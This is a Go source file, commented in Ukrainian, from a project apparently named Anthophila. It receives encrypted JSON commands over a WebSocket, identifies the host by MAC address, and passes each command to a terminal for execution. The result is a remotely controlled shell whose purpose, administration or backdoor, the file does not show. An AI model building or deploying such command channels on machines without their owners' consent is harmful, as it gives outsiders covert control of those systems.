package management

import (
	"Anthophila/information"
	"Anthophila/logging"

	"context"
	"encoding/json"
	"fmt"
	"strings"
	"sync"

	"github.com/gorilla/websocket"
)

// Reader - структура, яка забезпечує обробку отриманих повідомлень через WebSocket.
type Reader struct {
	Ctx           context.Context // для завершення Reader
	Logger        *logging.LoggerService
	Encryptor     *CryptoManager    // Менеджер шифрування для захисту даних
	Terminal      TerminalInterface // Інтерфейс для роботи з терміналом
	CurrentClient string            // Додається, щоб зберігати поточного клієнта для відповіді
	cancelOutput  chan struct{}     // Канал для зупинки старої горутини
	mu            sync.Mutex        // М'ютекс для потокобезпечного доступу
	Sender        *Sender
}

// NewReader створює новий екземпляр `Reader` з параметрами
func NewReader(ctx context.Context, logger *logging.LoggerService, encryptor *CryptoManager, ws *websocket.Conn) *Reader {
	r := &Reader{
		Ctx:          ctx,
		Logger:       logger,
		Encryptor:    encryptor,
		cancelOutput: make(chan struct{}),
		Sender:       NewSender(ws, logger), // ← правильна змінна тут!,
	}
	r.initTerminal(ws)
	return r
}

// initTerminal запускає новий термінал і запускає горутину, яка читає вихід з нього
func (r *Reader) initTerminal(ws *websocket.Conn) {
	// Якщо попередній термінал існує — зупиняємо
	if r.Terminal != nil {
		r.Terminal.Stop()
	}

	// Ініціалізація нового TerminalHandler
	handler := NewTerminalHandler(r.Logger, ws, r.Encryptor, &r.CurrentClient, r.Sender)

	if err := handler.Start(); err != nil {
		r.Logger.Log("Failed to start terminal: ", err.Error())
		return
	}

	// Призначаємо інтерфейсне посилання
	r.Terminal = handler
}

// ReadMessage читає повідомлення з WebSocket і логгує їх
func (r *Reader) ReadMessage(ws *websocket.Conn) {
	for {
		_, message, err := ws.ReadMessage()
		if err != nil {
			r.Logger.Log("Error reading message: %v", err.Error())
		}
		r.Logger.Log("Received: ", string(message))
	}
}

// ReadMessageCommand читає повідомлення з командою, обробляє її та надсилає відповідь або передає в термінал
func (r *Reader) ReadMessageCommand(wSocket *websocket.Conn) {
	for {
		select {
		case <-r.Ctx.Done(): //знищуємо горутину якщо в нас викликається Done() то ми повертаємо  return нічого тим самим знищуємо горутину
			r.Logger.Log("Reader: context cancelled, shutting down", " not connected")
			r.Sender.Close()
			if r.Terminal != nil {
				r.Terminal.Stop()
			}
			return

		default:
			_, message, err := wSocket.ReadMessage()
			if err != nil {
				r.Logger.Log("Error reading message: ", err.Error())
				return
			}
			// 1. Розшифрування
			decrypted := r.Encryptor.DecryptText(string(message))
			// 2. Перевірка, чи дійсно щось розшифрувалося
			if decrypted == "" {
				r.Logger.Log("Failed to decrypt message", string(message))
				continue
			}

			// 3. Логування розшифрованого тексту
			fmt.Println("Received decrypted message: ", decrypted)

			// 4. Парсинг JSON
			var cmd Message
			if err := json.Unmarshal([]byte(decrypted), &cmd); err != nil {
				r.Logger.Log("Failed to unmarshal decrypted JSON:", decrypted)
				continue
			}

			r.mu.Lock()
			r.CurrentClient = cmd.SClient
			r.mu.Unlock()
			fmt.Println("Received text Command: ", string(cmd.Message))

			if cmd.Message == "help" {
				fmt.Println("Available commands: help, restart, exit, terminal")
				msg := Message{
					SClient: information.NewInfo().GetMACAddress(),
					RClient: cmd.SClient,
					Message: EscapeTerminalMessage(cmd.Message),
				}

				jsonData, err := json.Marshal(msg)
				if err != nil {
					r.Logger.Log("Error marshalling JSON:", err.Error())
					continue
				}
				encrypted := r.Encryptor.EncryptText(string(jsonData))

				r.Sender.Send([]byte(encrypted))

			} else {
				if strings.TrimSpace(cmd.Message) == "restart" || strings.TrimSpace(cmd.Message) == "exit" {
					r.initTerminal(wSocket)
					continue
				}

				if r.Terminal != nil {
					r.Terminal.SendCommand(cmd.Message)
				} else {
					r.Logger.Log("Terminal not initialized command ignored: ", cmd.Message)
				}
			}
		}
	}
}
